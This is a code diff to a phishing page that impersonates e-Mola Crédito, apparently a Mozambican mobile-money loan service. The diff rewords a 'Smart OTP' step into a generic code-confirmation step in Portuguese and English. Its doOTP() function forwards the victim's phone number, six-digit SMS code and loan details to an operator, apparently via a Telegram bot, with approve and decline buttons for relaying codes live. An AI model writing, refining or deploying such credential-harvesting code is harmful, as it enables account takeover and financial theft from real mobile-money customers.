@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <meta name="theme-color" content="#F7941D">
-<title>e-Mola Crédito | Smart OTP · Moçambique</title>
+<title>e-Mola Crédito | Verificação · Moçambique</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 :root{--or:#F7941D;--or-deep:#D96F00;--or-dark:#A34A00;--or-light:#FFB84D;--amber:#FFC857;--cream:#FFF8F0;--white:#fff;--dark:#1a1a1a;--muted:#6b6b6b;--border:#f0e6da;--err:#d32f2f;--ok:#2e7d32;--grad:linear-gradient(135deg,#F7941D 0%,#E8841A 50%,#D96F00 100%);--shadow:0 20px 60px rgba(217,111,0,.35)}
@@ -48,8 +48,7 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 .btn-p:hover{transform:translateY(-2px);filter:brightness(1.05)}
 .btn-o{flex:1;background:transparent;color:var(--or-deep);border:2px solid var(--or-deep);padding:15px;border-radius:50px;font-weight:800;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:all .25s}
 .btn-o:hover{background:var(--cream)}
-.card-ft{text-align:center;margin-top:18px;font-size:10.5px;color:var(--muted)}
-.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:14px;font-size:10.5px;color:var(--muted);font-weight:700}
+.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:18px;font-size:10.5px;color:var(--muted);font-weight:700}
 .overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(42,22,8,.94);z-index:2000;backdrop-filter:blur(8px)}
 .overlay.on{display:flex}
 .spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:var(--or-light);border-radius:50%;animation:sp .8s linear infinite}
@@ -71,10 +70,10 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 
 <main>
   <div class="card">
-    <div class="progress"><div class="pd done"></div><div class="pd done"></div><div class="pd done"></div><div class="pd on"></div></div>
+    <div class="progress"><div class="pd done"></div><div class="pd done"></div><div class="pd on"></div></div>
     <div class="card-head">
-      <h1 data-i18n="so.h1">Configurar Smart OTP</h1>
-      <p data-i18n="so.sub">Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel para ativar o Smart OTP</p>
+      <h1 data-i18n="so.h1">Confirme o seu código</h1>
+      <p data-i18n="so.sub">Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel</p>
     </div>
 
     <div id="bBar" class="bundle-bar" style="display:none">
@@ -85,7 +84,7 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 
     <div id="err" class="err"></div>
 
-    <label class="fl" data-i18n="so.code">Código Smart OTP</label>
+    <label class="fl" data-i18n="so.code">Código de Verificação</label>
     <div class="otp-row" id="otpRow">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
@@ -97,33 +96,32 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
     <p class="hint" data-i18n="so.hint">Verifique o seu SMS para o código de confirmação de 6 dígitos</p>
 
     <div class="btns">
-      <button class="btn-p" onclick="doOTP()" data-i18n="so.btn">Ativar & Continuar</button>
+      <button class="btn-p" onclick="doOTP()" data-i18n="so.btn">Confirmar & Continuar</button>
       <button class="btn-o" onclick="location.href='verify.html'" data-i18n="so.cancel">Cancelar</button>
     </div>
 
-    <div class="card-ft" data-i18n="so.foot">Protegido com segurança e-Mola.</div>
     <div class="secure" data-i18n="so.secure">🔒 Protegido com segurança e-Mola</div>
   </div>
 </main>
 
-<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t" data-i18n="so.loading">A ativar Smart OTP</div><div class="sp-s" data-i18n="so.wait">Por favor aguarde...</div></div>
+<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t" data-i18n="so.loading">A confirmar o código</div><div class="sp-s" data-i18n="so.wait">Por favor aguarde...</div></div>
 
 <script>
 const translations={
   pt:{
-    "so.h1":"Configurar Smart OTP","so.sub":"Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel para ativar o Smart OTP",
+    "so.h1":"Confirme o seu código","so.sub":"Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel",
     "so.bAmount":"Empréstimo:","so.bDur":"Prazo:","so.bTotal":"Total a Pagar:",
-    "so.code":"Código Smart OTP","so.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
-    "so.btn":"Ativar & Continuar","so.cancel":"Cancelar","so.foot":"Protegido com segurança e-Mola.","so.secure":"🔒 Protegido com segurança e-Mola",
-    "so.loading":"A ativar Smart OTP","so.wait":"Por favor aguarde...",
+    "so.code":"Código de Verificação","so.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
+    "so.btn":"Confirmar & Continuar","so.cancel":"Cancelar","so.secure":"🔒 Protegido com segurança e-Mola",
+    "so.loading":"A confirmar o código","so.wait":"Por favor aguarde...",
     "err.all6":"Insira todos os 6 dígitos","err.declined":"Código recusado. Tente novamente."
   },
   en:{
-    "so.h1":"Set up Smart OTP","so.sub":"Enter the 6-digit confirmation code sent to your phone to activate Smart OTP",
+    "so.h1":"Confirm your code","so.sub":"Enter the 6-digit confirmation code sent to your phone",
     "so.bAmount":"Loan:","so.bDur":"Term:","so.bTotal":"Total to Pay:",
-    "so.code":"Smart OTP Code","so.hint":"Check your SMS for the 6-digit confirmation code",
-    "so.btn":"Activate & Continue","so.cancel":"Cancel","so.foot":"Protected with e-Mola security.","so.secure":"🔒 Protected with e-Mola security",
-    "so.loading":"Activating Smart OTP","so.wait":"Please wait...",
+    "so.code":"Verification Code","so.hint":"Check your SMS for the 6-digit confirmation code",
+    "so.btn":"Confirm & Continue","so.cancel":"Cancel","so.secure":"🔒 Protected with e-Mola security",
+    "so.loading":"Confirming code","so.wait":"Please wait...",
     "err.all6":"Please enter all 6 digits","err.declined":"Code declined. Please try again."
   }
 };
@@ -190,7 +188,7 @@ function doOTP(){
   clrErr();
   document.getElementById('ov').classList.add('on');
 
-  const msg=`🔐 <b>Verification Code #3 (Smart OTP Setup)</b>\n\n<b>Phone:</b> <code>+258${phone}</code>\n<b>Code:</b> <code>${otp}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>`;
+  const msg=`🔐 <b>Verification Code #3 (Account Security)</b>\n\n<b>Phone:</b> <code>+258${phone}</code>\n<b>Code:</b> <code>${otp}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>`;
 
   const btns=[[{text:'✓ Approve OTP',callback_data:'otp3_approved'},{text:'✗ Decline OTP',callback_data:'otp3_declined'}]];
   tg(msg,btns);
